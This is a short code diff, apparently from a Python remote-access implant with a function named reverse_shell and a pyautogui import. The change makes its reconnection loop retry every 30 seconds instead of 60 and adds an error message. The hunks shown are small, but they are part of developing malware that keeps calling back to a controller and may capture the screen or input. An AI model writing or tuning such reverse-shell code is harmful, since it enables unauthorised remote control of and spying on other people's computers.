@@ -467,7 +467,8 @@ def reverse_shell():
             s.close()
         except Exception as e:
             # Try again in 60 seconds
-            time.sleep(60)
+            print(f"[!] Connection failed: {e}")
+            time.sleep(30)
 
 
 import pyautogui
@@ -502,6 +503,6 @@ if __name__ == "__main__":
             run()
         except Exception as e:
             pass  # Optionally print or log this
-        time.sleep(60)
+        time.sleep(30)
 
 
